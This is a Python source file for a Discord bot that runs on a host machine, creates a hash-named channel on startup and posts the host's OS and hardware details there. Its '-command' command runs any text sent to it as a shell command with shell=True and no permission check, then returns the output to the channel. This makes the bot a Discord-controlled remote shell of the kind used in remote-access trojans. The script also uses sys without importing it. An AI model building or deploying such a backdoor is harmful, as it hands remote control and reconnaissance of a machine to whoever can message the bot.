import discord
from discord.ext import commands
import subprocess
import platform
import hashlib
import os

# Check and install required dependencies
try:
    import discord
except ImportError:
    print("discord.py library not found. Installing...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "discord.py"])

# Set your bot token here
TOKEN = os.environ.get('BOT_TOKEN')  # Use environment variable for token

# Create an instance of the bot
bot = commands.Bot(command_prefix='-')
bot.text_channel = None  # Initialize the bot's text channel attribute

# Event handler when the bot is ready
@bot.event
async def on_ready():
    print(f'We have logged in as {bot.user.name}')

    # Create a text channel with the first 7 letters of the bot's hash
    hash_object = hashlib.md5(bot.user.name.encode())
    channel_name = hash_object.hexdigest()[:7]
    guild = bot.guilds[0]  # Assuming the bot is only in one guild
    bot.text_channel = await guild.create_text_channel(channel_name)

    # Send system information in the created channel
    try:
        await bot.text_channel.send("Bot is online!\n")
        await system_info(bot.text_channel)
    except Exception as e:
        print(f'Error sending system information: {e}')

# Define a command to execute system commands
@bot.command(name='command')
async def execute_command(ctx, *, command):
    try:
        # Execute the system command
        result = subprocess.check_output(command, shell=True, text=True)
        await bot.text_channel.send(f'Command executed successfully:\n```\n{result}\n```')
    except subprocess.CalledProcessError as e:
        await bot.text_channel.send(f'Error executing command:\n```\n{e}\n```')

# Define a command to get system information and generate a hash
@bot.command(name='systeminfo')
async def system_info(ctx):
    try:
        system_info = f"System: {platform.system()} {platform.version()}\n"
        system_info += f"Machine: {platform.machine()}\n"
        system_info += f"Processor: {platform.processor()}"

        # Generate a hash of the system information
        hash_object = hashlib.md5(system_info.encode())
        system_hash = hash_object.hexdigest()

        await ctx.send(f"System Information:\n```\n{system_info}\n```\nSystem Hash: {system_hash}")
    except Exception as e:
        await ctx.send(f'Error getting system information:\n```\n{e}\n```')

# Run the bot with the token
bot.run(TOKEN)
